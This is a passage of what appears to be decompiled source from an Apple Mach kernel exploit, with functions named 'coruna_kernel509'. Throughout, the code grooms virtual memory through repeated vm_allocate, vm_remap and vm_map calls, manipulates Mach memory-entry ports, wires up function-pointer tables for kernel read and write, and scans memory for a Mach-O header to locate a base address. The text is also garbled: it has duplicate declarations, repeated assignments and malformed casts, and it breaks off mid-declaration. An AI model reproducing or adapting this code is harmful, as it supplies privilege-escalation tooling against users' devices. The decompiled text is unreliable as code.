    if (u == 0x100000) {
      scratch = k_kernel_rodata_word_00042ec8;
      scratch = k_kernel_rodata_word_42ec0;
      bootargs = k_kernel_rodata_word_00042ed8;
      bootargs = k_kernel_rodata_word_42ed0;
    }
    else {
      scratch = k_kernel_rodata_word_42ea0;
      scratch = k_kernel_rodata_word_00042ea8;
      if ((u != 0x4000000) &&
         (scratch = k_kernel_rodata_word_42ee0, scratch = k_kernel_rodata_word_00042ee8, u != 0x1000000)) {
        return;
      }
      bootargs = k_kernel_rodata_word_00042eb8;
      bootargs = k_kernel_rodata_word_42eb0;
    }
    ptr = _calloc(1,0x5e8);
    if (ptr != (void *)0x0) {
      if (*(long *)(k_kernel_os_alloc_once_table_slot + 0x510) == -1) {
        buf = *(long **)(k_kernel_os_alloc_once_table_slot + 0x518);
      }
      else {
        buf = (long *)__os_alloc_once(k_kernel_os_alloc_once_table_slot + 0x510,0x10,0);
      }
      if (*buf != 0) {
        *(long *)((long)ptr + 0x10) = *buf;
      }
      *(uint64_t *)((long)ptr + 0x5a0) = bootargs;
      *(long *)((long)ptr + 0x598) = bootargs;
      *(uint64_t *)((long)ptr + 0x5b0) = scratch;
      *(uint64_t *)((long)ptr + 0x5a8) = scratch;
      size = k_kernel_rodata_word_42e80;
      version = k_kernel_rodata_word_00042e88;
      if ((bootargs == 0x10) || (size = k_kernel_rodata_word_42e90, version = k_kernel_rodata_word_00042e98, bootargs == 0x40)) {
        *(uint64_t *)((long)ptr + 0x5e0) = version;
        *(uint64_t *)((long)ptr + 0x5d8) = size;
      }
      coruna_mach_timebase_info_7e88();
      coruna_vm_allocate_9204(ptr);
      coruna_kernel509_via_kernel509_via_mach_port_deallocate(ptr);
      coruna_kernel509_via_thread_switch(ptr);
      coruna_thread_switch_a4e8(ptr);
      coruna_kernel509_via_vm_copy_88e0_4(ptr);
      *(uint **)((long)ptr + 0x5d0) = size;
      if (*buf == 0) {
        *buf = *(long *)((long)ptr + 0x10);
      }
      *(void (**)(size + 0xc) = coruna_kernel509_via_kernel509_via_vm_copy_88e0;
      *(void (**)(size + 0xe) = coruna_kernel509_via_vm_copy_88e0_5;
      *(void (**)(size + 0x10) = coruna_kernel509_via_kernel509_via_vm_copy_8988;
      *(void (**)(size + 0x12) = coruna_kernel509_via_vm_copy_8988_2;
      *(void (**)((long)ptr + 0x5b8) = coruna_kernel509_residual_288;
      *(void (**)((long)ptr + 0x5c0) = coruna_kernel509_residual_289;
      *(void **)(size + 0x14) = ptr;
      *(void (**)((long)ptr + 0x5c8) = coruna_kernel509_via_mach_vm_machine_attribute;
      *(void (**)(size + 0x78) = coruna_kernel509_str_08_3d_40_92_09_18_80_52;
      *(void **)(size + 0x7a) = ptr;
    }
  }
  return;
}
void coruna_kernel509_residual_288(uint64_t val,uint64_t id_2)
{
  int err;
  long handle;
  long scratch;
  
  handle = coruna_kernel509_via_fn_ptr_cast_2_8(val,*(uint32_t *)k_kernel_mach_task_self_slot,id_2);
  if (handle != 0) {
    err = coruna_kernel509_via_mach_vm_read_overwrite_2(val,handle + 0x38,&scratch);
    if (err != 0 && scratch != 0) {
      coruna_kernel509_residual_308(val,handle + 0x38,0);
    }
  }
  return;
}
void coruna_kernel509_residual_289(uint64_t val)
{
  int err;
  long handle;
  long scratch;
  
  handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4();
  if ((handle != 0) && (handle = coruna_kernel509_via_fn_ptr_cast_2_7(val,handle,1), handle != 0)) {
    err = coruna_kernel509_via_mach_vm_read_overwrite_2(val,handle + 0x38,&scratch);
    if ((err != 0) && (scratch != 0)) {
      coruna_kernel509_residual_308(val,handle + 0x38,0);
    }
  }
  return;
}
void coruna_kernel509_via_mach_vm_machine_attribute(uint64_t val,uint64_t id_2)
{
  int err;
  long handle;
  int scratch;
  uint64_t bootargs;
  
  bootargs = 0;
  scratch = 0;
  handle = coruna_kernel509_via_fn_ptr_cast_2_9(val,*(uint32_t *)k_kernel_mach_task_self_slot,id_2,&bootargs);
  if (handle != 0) {
    err = coruna_kernel509_via_mach_vm_read_overwrite(val,handle + 0x28,&scratch);
    if (err != 0 && scratch == 1) {
      scratch = 100;
      coruna_mach_vm_machine_attribute(val,handle + 0x28,100);
    }
  }
  return;
}
void coruna_call_vm_deallocate_bf04(long handle)
{
  if (*(long *)(handle + 0x50) != 0) {
    coruna_vm_deallocate_bf04();
  }
  return;
}
void coruna_kernel509_via_open_dev_null(long handle)
{
  int err;
  long handle;
  uint32_t scratch;
  
  scratch = 0xffffffff;
  handle = *(long *)(handle + 0x50);
  if ((handle != 0) && (err = coruna_open_dev_null(&scratch), err == 0)) {
    *(uint64_t *)(handle + 0x50) = 0;
    *(uint64_t *)(handle + 0x38) = 0;
    *(uint64_t *)(handle + 0x30) = 0;
    *(uint64_t *)(handle + 0x48) = 0;
    *(uint64_t *)(handle + 0x40) = 0;
    coruna_vm_deallocate_bfc0(handle);
    coruna_close(scratch);
  }
  return;
}
void coruna_mach_make_memory_entry_64_cb5c(long handle,uint32_t *size,mach_port_name_t *arg,
                 mach_port_name_t *arg,long addr_2)
{
  uint8_t *ptr;
  kern_return_t lk2;
  long handle;
  long addr;
  memory_object_size_t scratch;
  mach_port_t bootargs;
  mach_port_name_t thread_attr [2];
  
  thread_attr[0] = 0;
  thread_attr[1] = 0;
  bootargs = 0;
  addr = *(long *)(handle + 0x50);
  if (addr != 0) {
    handle = coruna_fn_ptr_cast_2(handle,*(uint64_t *)(addr + 0x518));
    if (((((handle != 0) && (*(long *)(addr + 0x520) != 0)) && (*(long *)(addr + 0x528) != 0)) &&
        ((handle = coruna_fn_ptr_cast_2(handle,*(uint64_t *)(addr + 0x530)), handle != 0 &&
         (handle = coruna_fn_ptr_cast_2(handle,*(uint64_t *)(addr + 0x538)),
         ptr = k_kernel_mach_task_self_slot, handle != 0)))) &&
       ((*(memory_object_offset_t *)(addr + 0x550) != 0 &&
        ((*(long *)(addr + 0x560) != 0 && (*(long *)(addr + 0x578) != 0)))))) {
      scratch = 0x4000;
      lk2 = _mach_make_memory_entry_64
                        (*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,
                         *(memory_object_offset_t *)(addr + 0x550),3,thread_attr + 1,0);
      if (lk2 == 0) {
        scratch = 0x4000;
        lk2 = _mach_make_memory_entry_64
                          (*(vm_map_t *)ptr,&scratch,*(memory_object_offset_t *)(addr + 0x560),
                           3,thread_attr,0);
        if (lk2 == 0) {
          scratch = 0x4000;
          lk2 = _mach_make_memory_entry_64
                            (*(vm_map_t *)ptr,&scratch,*(long *)(addr + 0x578) + 0x4000,3,
                             &bootargs,0);
          if (lk2 == 0) {
            *(uint64_t *)(addr_2 + 0x50) = *(uint64_t *)(addr + 0x518);
            *(uint64_t *)(addr_2 + 0x58) = 0;
            *(uint64_t *)(addr_2 + 0x60) = *(uint64_t *)(addr + 0x520);
            *(uint64_t *)(addr_2 + 0x68) = *(uint64_t *)(addr + 0x528);
            *(uint64_t *)(addr_2 + 0x70) = *(uint64_t *)(addr + 0x530);
            *(uint64_t *)(addr_2 + 0x78) = *(uint64_t *)(addr + 0x538);
            *size = thread_attr[1];
            *arg = thread_attr[0];
            thread_attr[0] = 0;
            thread_attr[1] = 0;
            *arg = bootargs;
            bootargs = 0;
          }
        }
      }
    }
    if (1 < thread_attr[1] + 1) {
      _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,thread_attr[1]);
    }
    if (1 < thread_attr[0] + 1) {
      _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,thread_attr[0]);
    }
    if (1 < bootargs + 1) {
      _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
    }
  }
  return;
}
void coruna_mach_make_memory_entry_cd90(long handle)
{
  mach_port_name_t name;
  uint8_t *ptr;
  uint u;
  uint8_t *buf;
  mach_port_name_t *lpm4;
  long handle;
  size_t size;
  long addr;
  mem_entry_name_port_t scratch;
  uint64_t *address;
  size_t bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint32_t host_info;
  uint64_t serial_buf;
  mem_entry_name_port_t action [4];
  long block_ctx;
  
  ptr = k_kernel_mach_task_self_slot;
  block_ctx = *(long *)k_kernel_stack_chk_guard_slot;
  serial_buf = 0;
  host_info = 0;
  size = *(size_t *)k_kernel_vm_page_size_slot;
  address = (uint64_t *)0x0;
  bootargs = size;
  u = _mach_make_memory_entry
                    (*(vm_map_t *)k_kernel_mach_task_self_slot,&bootargs,0,0x20003,&scratch,0);
  if ((u == 0) &&
     (u = _vm_map(*(vm_map_t *)ptr,(vm_address_t *)&ghidra_stack_1,size,0,1,scratch
                      ,0,0,3,2,(vm_inherit_t)address), u == 0)) {
    _bzero(address,size);
    *address = *(uint64_t *)(&k_kernel_slot_19d0 + handle);
    address[4] = *(uint64_t *)(&k_kernel_slot_1898 + handle);
    address[5] = (unsigned long)*(uint *)(&k_kernel_slot_18a0 + handle);
    buf = (uint8_t *)coruna_mach_make_memory_entry_64_cb5c(handle,(long)&serial_buf + 4,&serial_buf,&host_info);
    if ((int)buf == 0) {
      _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)address,size);
      action[0] = scratch;
      action[1] = serial_buf;
      action[2] = (uint32_t)serial_buf;
      action[3] = host_info;
      scratch = k_kernel_rodata_word_000437f8;
      thread_attr = k_kernel_rodata_word_437f0;
      lpm4 = (mach_port_name_t *)coruna_kernel509_via_task_info(handle,0x15);
      if (lpm4 == (mach_port_name_t *)0x0) {
        buf = &k_kernel_slot_1001;
      }
      else {
        addr = 0;
        do {
          name = *(mach_port_name_t *)((long)action + addr);
          handle = coruna_call_helper_25fa0(handle,name);
          if (handle == 0) {
            buf = (uint8_t *)0x2800e;
            break;
          }
          buf = (uint8_t *)coruna_kernel509_via_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_8(handle,handle);
          if ((int)buf != 0) break;
          u = _mach_port_mod_refs(*(ipc_space_t *)ptr,name,0,0xffff);
          if (u != 0) goto fail;
          *lpm4 = name;
          if (addr == 0xc) {
            buf = (uint8_t *)coruna_mach_port_deallocate_29404(handle);
            break;
          }
          lpm4 = (mach_port_name_t *)
                   coruna_kernel509_via_task_info(handle,*(uint32_t *)(((unsigned long)&thread_attr | 4) + addr));
          addr = addr + 4;
          buf = &k_kernel_slot_1001;
        } while (lpm4 != (mach_port_name_t *)0x0);
      }
    }
  }
  else {
fail:
    buf = (uint8_t *)(unsigned long)(u | 0x80000000);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(buf);
  }
  return;
}
void coruna_vm_deallocate_cfb8(long handle,uint64_t *val,mem_entry_name_port_t arg,
                 mem_entry_name_port_t arg,mem_entry_name_port_t val,long addr_2)
{
  uint8_t *ptr;
  vm_address_t lv2;
  kern_return_t lk3;
  long handle;
  long addr;
  void *ptr;
  uint64_t u;
  uint64_t size;
  uint64_t version;
  unsigned long port;
  vm_inherit_t lv11;
  vm_address_t scratch;
  vm_address_t bootargs;
  vm_address_t thread_attr;
  vm_prot_t host_info [2];
  vm_address_t serial_buf;
  vm_address_t action;
  vm_address_t block_ctx;
  vm_address_t stack_guard;
  vm_address_t sa_saved;
  
  sa_saved = 0;
  block_ctx = 0;
  stack_guard = 0;
  serial_buf = 0;
  action = 0;
  size = *(uint64_t *)(addr_2 + 0x50);
  handle = coruna_fn_ptr_cast_2(handle,size);
  if ((((handle != 0) && (port = *(unsigned long *)(addr_2 + 0x60), port != 0)) &&
      ((*(unsigned long *)(handle + 0x188) & port) == 0)) &&
     (handle = *(long *)(addr_2 + 0x68), handle != 0)) {
    u = *(uint64_t *)(addr_2 + 0x70);
    addr = coruna_fn_ptr_cast_2(handle);
    if (addr != 0) {
      version = *(uint64_t *)(addr_2 + 0x78);
      addr = coruna_fn_ptr_cast_2(handle,version);
      ptr = k_kernel_mach_task_self_slot;
      if (((addr != 0) &&
          (lk3 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&sa_saved,0xc000,1),
          lk3 == 0)) &&
         (lk3 = _vm_allocate(*(vm_map_t *)ptr,&sa_saved,0x4000,0x4002), lk3 == 0)) {
        host_info[0] = 0;
        host_info[1] = 0;
        lv11 = 1;
        lk3 = _vm_remap(*(vm_map_t *)ptr,&sa_saved,0x4000,0,0x4000,*(vm_map_t *)ptr,sa_saved
                          ,0,host_info + 1,host_info,1);
        if (lk3 == 0) {
          thread_attr = sa_saved + 0x4000;
          lk3 = _vm_allocate(*(vm_map_t *)ptr,&thread_attr,0x8000,0x4000);
          if (((lk3 == 0) &&
              (lk3 = _vm_allocate(*(vm_map_t *)ptr,&stack_guard,0xc000,1), lk3 == 0)) &&
             (lk3 = _vm_map(*(vm_map_t *)ptr,&stack_guard,0x4000,0,0x4000,arg,0,0,3,1,lv11),
             lk3 == 0)) {
            host_info[0] = 0;
            host_info[1] = 0;
            lv11 = 1;
            lk3 = _vm_remap(*(vm_map_t *)ptr,&stack_guard,0x4000,0,0x4000,*(vm_map_t *)ptr,
                              stack_guard,0,host_info + 1,host_info,1);
            if (lk3 == 0) {
              bootargs = stack_guard + 0x4000;
              lk3 = _vm_allocate(*(vm_map_t *)ptr,&bootargs,0x8000,0x4000);
              if ((((lk3 == 0) &&
                   (lk3 = _vm_copy(*(vm_map_t *)ptr,stack_guard,0xc000,sa_saved), lk3 == 0)) &&
                  (lk3 = _vm_allocate(*(vm_map_t *)ptr,&block_ctx,0xc000,1), lk3 == 0)) &&
                 (lk3 = _vm_map(*(vm_map_t *)ptr,&block_ctx,0x4000,0,0x4000,arg,0,0,3,1,
                                  lv11), lk3 == 0)) {
                host_info[0] = 0;
                host_info[1] = 0;
                lk3 = _vm_remap(*(vm_map_t *)ptr,&block_ctx,0x4000,0,0x4000,*(vm_map_t *)ptr,
                                  block_ctx,0,host_info + 1,host_info,1);
                if (lk3 == 0) {
                  scratch = block_ctx + 0x4000;
                  lk3 = _vm_allocate(*(vm_map_t *)ptr,&scratch,0x4000,0x4002);
                  if (lk3 == 0) {
                    host_info[0] = 0;
                    host_info[1] = 0;
                    lk3 = _vm_remap(*(vm_map_t *)ptr,&scratch,0x4000,0,0x4000,
                                      *(vm_map_t *)ptr,scratch,0,host_info + 1,host_info,1);
                    if (((lk3 == 0) &&
                        (lk3 = _vm_allocate(*(vm_map_t *)ptr,&action,0xc000,1), lk3 == 0))
                       && (lk3 = _vm_allocate(*(vm_map_t *)ptr,&action,0x4000,0x4002),
                          lk3 == 0)) {
                      host_info[0] = 0;
                      host_info[1] = 0;
                      lk3 = _vm_remap(*(vm_map_t *)ptr,&action,0x4000,0,0x4000,
                                        *(vm_map_t *)ptr,action,0,host_info + 1,host_info,1);
                      if (lk3 == 0) {
                        scratch = action + 0x4000;
                        lk3 = _vm_allocate(*(vm_map_t *)ptr,&scratch,0x4000,0x4002);
                        if (lk3 == 0) {
                          host_info[0] = 0;
                          host_info[1] = 0;
                          lk3 = _vm_remap(*(vm_map_t *)ptr,&scratch,0x4000,0,0x4000,
                                            *(vm_map_t *)ptr,scratch,0,host_info + 1,host_info,1);
                          if (((lk3 == 0) &&
                              (lk3 = _vm_allocate(*(vm_map_t *)ptr,&serial_buf,0xc000,1),
                              lk3 == 0)) &&
                             (lk3 = _vm_allocate(*(vm_map_t *)ptr,&serial_buf,0x4000,0x4002),
                             lk3 == 0)) {
                            host_info[0] = 0;
                            host_info[1] = 0;
                            lv11 = 1;
                            lk3 = _vm_remap(*(vm_map_t *)ptr,&serial_buf,0x4000,0,0x4000,
                                              *(vm_map_t *)ptr,serial_buf,0,host_info + 1,host_info,1
                                             );
                            if (lk3 == 0) {
                              scratch = serial_buf + 0x4000;
                              lk3 = _vm_map(*(vm_map_t *)ptr,&scratch,0x4000,0,0x4000,val,
                                              0,0,3,1,lv11);
                              if (lk3 == 0) {
                                host_info[0] = 0;
                                host_info[1] = 0;
                                lk3 = _vm_remap(*(vm_map_t *)ptr,&scratch,0x4000,0,0x4000,
                                                  *(vm_map_t *)ptr,scratch,0,host_info + 1,
                                                  host_info,1);
                                if ((lk3 == 0) &&
                                   (ptr = _calloc(1,0x5e8), lv2 = block_ctx,
                                   ptr != (void *)0x0)) {
                                  *(uint64_t *)((long)ptr + 0x518) = size;
                                  *(unsigned long *)((long)ptr + 0x520) = port;
                                  *(long *)((long)ptr + 0x528) = handle;
                                  *(uint64_t *)((long)ptr + 0x530) = u;
                                  *(uint64_t *)((long)ptr + 0x538) = version;
                                  *(vm_address_t *)((long)ptr + 0x548) = sa_saved;
                                  *(vm_address_t *)((long)ptr + 0x550) = stack_guard;
                                  *(uint64_t *)((long)ptr + 0x558) = 0xc000;
                                  sa_saved = 0;
                                  block_ctx = 0;
                                  stack_guard = 0;
                                  *(vm_address_t *)((long)ptr + 0x560) = lv2;
                                  *(vm_address_t *)((long)ptr + 0x568) = action;
                                  *(uint64_t *)((long)ptr + 0x570) = 0xc000;
                                  *(vm_address_t *)((long)ptr + 0x578) = serial_buf;
                                  *(vm_address_t *)((long)ptr + 0x580) = lv2;
                                  *(uint64_t *)((long)ptr + 0x588) = 0xc000;
                                  serial_buf = 0;
                                  action = 0;
                                  *val = ptr;
                                  if (action != 0) {
                                  _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,action,0xc000);
                                  }
                                  if (serial_buf != 0) {
                                  _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,serial_buf,0xc000);
                                  }
                                  if (sa_saved != 0) {
                                  _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,sa_saved,0xc000);
                                  }
                                  if (stack_guard != 0) {
                                  _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,stack_guard,0xc000);
                                  }
                                  return;
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  if (block_ctx != 0) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,block_ctx,0xc000);
  }
fail:
  if (action != 0) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,action,0xc000);
  }
  if (serial_buf != 0) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,serial_buf,0xc000);
  }
  if (sa_saved != 0) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,sa_saved,0xc000);
  }
  if (stack_guard != 0) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,stack_guard,0xc000);
  }
  return;
}
void coruna_mach_port_deallocate_d5e0(long handle,uint *size)
{
  mach_port_name_t name;
  uint8_t *ptr;
  kern_return_t lk2;
  int err;
  uint64_t u;
  mach_port_name_t *lpm5;
  vm_size_t size;
  int status;
  long handle;
  vm_inherit_t in_stack_ffffffffffffff60;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t scratch;
  int thread_attr;
  uint64_t *host_info;
  mem_entry_name_port_t serial_buf [2];
  uint64_t bootargs;
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  serial_buf[0] = 0;
  serial_buf[1] = 0;
  bootargs = 0;
  host_info = (uint64_t *)0x0;
  size = *(vm_size_t *)k_kernel_vm_page_size_slot;
  thread_attr = -1;
  if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
    u = 0xad001;
  }
  else {
    u = coruna_open_dev_null(&thread_attr);
    if ((int)u == 0) {
      status = 0x28026;
      scratch = k_kernel_rodata_word_000437f8;
      bootargs = k_kernel_rodata_word_437f0;
      lpm5 = (mach_port_name_t *)coruna_kernel509_via_task_info(handle,0x15);
      ptr = k_kernel_mach_task_self_slot;
      err = 0x28026;
      if (lpm5 != (mach_port_name_t *)0x0) {
        handle = 0;
        do {
          name = *lpm5;
          *(mach_port_name_t *)((long)serial_buf + handle) = name;
          err = 0x28026;
          if ((name + 1 < 2) ||
             (lk2 = _mach_port_mod_refs(*(ipc_space_t *)ptr,name,0,1), err = status,
             lk2 != 0)) break;
          if (handle == 0xc) {
            lk2 = _vm_map(*(vm_map_t *)ptr,(vm_address_t *)&host_info,size,0,1,serial_buf[0],0,0,3
                            ,2,in_stack_ffffffffffffff60);
            if (lk2 == 0) {
              u = *host_info;
              handle = coruna_fn_ptr_cast_2(handle,u);
              if (handle != 0) {
                *(uint64_t *)(&k_kernel_slot_19d0 + handle) = u;
                u = host_info[4];
                handle = coruna_fn_ptr_cast_2(handle,u);
                if (handle != 0) {
                  *(uint64_t *)(&k_kernel_slot_1898 + handle) = u;
                  if (host_info[5] - 1 < 0x20) {
                    *(int *)(&k_kernel_slot_18a0 + handle) = (int)host_info[5];
                    scratch = 0;
                    err = coruna_vm_deallocate_cfb8(handle,&scratch,serial_buf[1],bootargs & 0xffffffff,
                                         bootargs);
                    if (err == 0) {
                      *(void (**)(handle + 0x30) = coruna_kernel509_via_kernel509_via_vm_copy_88e0;
                      *(void (**)(handle + 0x38) = coruna_kernel509_via_vm_copy_88e0_5;
                      *(void (**)(handle + 0x40) = coruna_kernel509_via_kernel509_via_vm_copy_8988;
                      *(void (**)(handle + 0x48) = coruna_kernel509_via_vm_copy_8988_2;
                      *(uint64_t *)(handle + 0x50) = scratch;
                      coruna_close(thread_attr);
                      thread_attr = -1;
                      err = coruna_pthread_mach_thread_np_289c8(handle,0);
                      if (err == 0) {
                        *(uint64_t *)(handle + 0x30) = 0;
                        err = coruna_pthread_mach_thread_np_29b88(handle,0);
                        if (err == 0) {
                          *(uint64_t *)(handle + 0x40) = 0;
                        }
                      }
                    }
                  }
                }
              }
            }
            break;
          }
          lpm5 = (mach_port_name_t *)
                   coruna_kernel509_via_task_info(handle,*(uint32_t *)(((unsigned long)&bootargs | 4) + handle));
          handle = handle + 4;
        } while (lpm5 != (mach_port_name_t *)0x0);
      }
      if (thread_attr != -1) {
        coruna_close();
      }
      if (err != 0) {
        handle = 0;
        do {
          if (1 < *(mach_port_name_t *)((long)serial_buf + handle) + 1) {
            _mach_port_deallocate
                      (*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)serial_buf + handle));
          }
          handle = handle + 4;
        } while (handle != 0x10);
      }
      if (host_info != (uint64_t *)0x0 && size != 0) {
        _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)host_info,size);
      }
      u = 0;
      *size = (uint)(err == 0);
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == action) {
    return;
  }
  ___stack_chk_fail(u);
}
void coruna_kernel509_residual_290(long handle)
{
  if (*(long *)(handle + 0x50) != 0) {
    return;
  }
  return;
}
void coruna_kernel09_residual_253(void)
{
  DataSynchronizationBarrier(3,3,0);
  InstructionSynchronizationBarrier();
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_22818(long handle,unsigned long arg,uint64_t val)
{
  long handle;
  uint u;
  uint size;
  unsigned long version;
  int err;
  unsigned long port;
  long addr;
  unsigned long tag;
  int scratch;
  uint64_t bootargs[5];
  unsigned long thread_attr [4];
  unsigned long host_info;
  unsigned long *serial_buf;
  uint8_t ***action;
  uint32_t block_ctx;
  unsigned long stack_guard [2];
  unsigned long *sa_saved;
  unsigned long sa_new [2];
  long path_buf;
  long tmp_buf;
  long region;
  uint8_t **plist;
  unsigned long *url_buf;
  char json_buf;
  unsigned long frame;
  long work;
  
  work = *(long *)k_kernel_stack_chk_guard_slot;
  err = coruna_mach_absolute_time_1a9c0(handle,7,&k_kernel_slot_2710);
  if (*(long *)k_kernel_stack_chk_guard_slot != work) {
  ___stack_chk_fail();
  }
  return;
}
void coruna_kernel509_residual_291(unsigned long *arg,unsigned long arg)
{
  int err;
  long handle;
  unsigned long u;
  
  arg = arg & 0xffffffffffffc000;
  while( true ) {
    *arg = arg;
    err = coruna_kernel509_residual_294(arg);
    if ((((err == -0x1120531) && (err = coruna_kernel509_residual_294(arg,*arg + 4), err == 0x100000c))
        && (err = coruna_kernel509_residual_294(arg,*arg + 8), err == 2)) &&
       (err = coruna_kernel509_residual_294(arg,*arg + 0xc), err == 0xc)) break;
    arg = *arg - 0x4000;
  }
  u = *arg;
  handle = coruna_kernel509_via_fn_ptr_cast_10_29(arg[4]);
  arg[1] = u - handle;
  return;
}
void coruna_vm_map_de28(long handle)
{
  int *err;
  mem_entry_name_port_t object;
  char err;
  bool err;
  uint8_t *ptr;
  kern_return_t lk5;
  vm_size_t size;
  vm_inherit_t in_stack_ffffffffffffffb0;
  vm_address_t scratch;
  
  size = *(vm_size_t *)(&k_kernel_slot_3630 + handle);
  object = *(mem_entry_name_port_t *)(&k_kernel_slot_3638 + handle);
  if (size != 0 && object != 0) {
    err = (int *)(&k_kernel_slot_3640 + handle);
    do {
      err = '\x01';
      err = (bool)coruna_ldrex_pass(err,0x10);
      if (err) {
        *err = *err + 1;
        err = coruna_ldrexp_clear();
      }
      ptr = k_kernel_mach_task_self_slot;
    } while (err != '\0');
    do {
      if (((&k_kernel_slot_363c)[handle] & 1) != 0) {
        return;
      }
      scratch = 0;
      lk5 = _vm_map(*(vm_map_t *)ptr,&scratch,size,0,0,object,0,1,1,1,
                      in_stack_ffffffffffffffb0);
    } while (lk5 == 1);
  }
  return;
}
void coruna_vm_region_recurse_64_df14(vm_address_t arg)
{
  mach_msg_type_number_t scratch;
  int bootargs [20];
  vm_size_t thread_attr;
  vm_address_t host_info;
  
  thread_attr = 0;
  bootargs[0x13] = 0;
  bootargs[0x11] = 0;
  bootargs[0x12] = 0;
  bootargs[0x10] = 0;
  bootargs[10] = 0;
  bootargs[0xb] = 0;
  bootargs[8] = 0;
  bootargs[9] = 0;
  bootargs[0xe] = 0;
  bootargs[0xf] = 0;
  bootargs[0xc] = 0;
  bootargs[0xd] = 0;
  bootargs[2] = 0;
  bootargs[3] = 0;
  bootargs[0] = 0;
  bootargs[1] = 0;
  bootargs[6] = 0;
  bootargs[7] = 0;
  bootargs[4] = 0;
  bootargs[5] = 0;
  scratch = 0x13;
  host_info = arg;
  _vm_region_recurse_64
            (*(vm_map_t *)k_kernel_mach_task_self_slot,&host_info,&thread_attr,
             (natural_t *)(bootargs + 0x13),bootargs,&scratch);
  return;
}
void coruna_mach_make_memory_entry_dfa0(long handle,vm_size_t arg,long addr_2,mem_entry_name_port_t *arg_x)
{
  uint *ptr;
  vm_address_t *address;
  uint u;
  uint8_t *buf;
  kern_return_t lk4;
  long handle;
  long addr;
  vm_size_t scratch;
  
  buf = k_kernel_mach_task_self_slot;
  ptr = (uint *)(&k_kernel_slot_6648 + handle);
  addr = 0x100;
  while( true ) {
    u = *ptr;
    if (0x3ff < u) {
      return;
    }
    address = (vm_address_t *)(&k_kernel_slot_4648 + handle + (unsigned long)u * 8);
    lk4 = _vm_allocate(*(vm_map_t *)buf,address,arg,3);
    if (lk4 != 0) {
      return;
    }
    *ptr = *ptr + 1;
    handle = coruna_vm_region_recurse_64_df14(*address);
    if (handle == 0) {
      return;
    }
    if (handle == addr_2) break;
    addr = addr + -1;
    if (addr == 0) {
      return;
    }
  }
  scratch = arg;
  lk4 = _mach_make_memory_entry(*(vm_map_t *)buf,&scratch,*address,3,arg_x,0);
  if (lk4 != 0) {
    return;
  }
  *(mem_entry_name_port_t *)(&k_kernel_slot_3644 + handle + (unsigned long)u * 4) = *arg_x;
  return;
}
void coruna_vm_map_e0c0(vm_address_t *arg,vm_size_t arg_x,vm_address_t arg,int flags,
                 int count_2)
{
  uint8_t *ptr;
  kern_return_t lk2;
  vm_inherit_t in_stack_ffffffffffffffa0;
  vm_address_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  count_2 = count_2 + 1;
  do {
    scratch = *arg;
    lk2 = _vm_map(*(vm_map_t *)ptr,&scratch,arg_x,arg,flags,0,0,0,3,1,
                    in_stack_ffffffffffffffa0);
    if (lk2 == 0) {
      *arg = scratch;
      return;
    }
    count_2 = count_2 + -1;
  } while (count_2 != 0);
  return;
}
void coruna_mach_make_memory_entry_64_e190(long handle,void *ctx,uint size,long *addr_2)
{
  vm_size_t lv1;
  int err;
  uint32_t u;
  unsigned long size;
  uint8_t *ptr;
  uint8_t *buf;
  uint64_t *str;
  bool err;
  int status;
  uint version;
  uint port;
  uint tag;
  vm_address_t *ptr;
  void **lppv14;
  uint64_t *copy;
  vm_address_t lv16;
  long handle;
  uint32_t *data;
  long addr;
  uint64_t *obj;
  vm_address_t *buf;
  vm_size_t size;
  mach_port_name_t *lpm22;
  long off;
  mach_port_t *object_handle;
  pthread_t *pp_Var24;
  unsigned long kind;
  mem_entry_name_port_t object;
  unsigned long type_id;
  unsigned long type_id_8;
  unsigned long type_id_9;
  vm_address_t *str;
  vm_address_t *copy;
  vm_address_t *data;
  vm_size_t size_00;
  vm_inherit_t in_stack_fffffffffffffb70;
  vm_size_t scratch;
  uint32_t bootargs;
  mach_msg_type_number_t thread_attr;
  vm_address_t host_info;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t serial_buf;
  unsigned long host_info;
  uint64_t serial_buf;
  uint32_t action;
  uint32_t action;
  uint32_t block_ctx;
  vm_address_t *block_ctx;
  natural_t stack_guard;
  vm_size_t sa_saved;
  uint64_t *sa_new;
  vm_size_t path_buf;
  mach_msg_type_number_t tmp_buf;
  natural_t region;
  uint64_t plist;
  uint64_t url_buf;
  memory_object_size_t json_buf;
  uint32_t stack_guard;
  uint32_t sa_saved;
  uint32_t sa_new;
  uint32_t path_buf;
  uint64_t tmp_buf;
  uint64_t frame;
  uint64_t region;
  uint64_t plist;
  uint32_t url_buf;
  uint32_t work;
  uint32_t json_buf;
  uint64_t frame;
  vm_address_t cache;
  mach_port_t cache_20;
  uint64_t *cache_21;
  vm_address_t cache_22;
  vm_address_t cache_23 [80];
  pthread_t cache_24 [5];
  uint64_t cache_25;
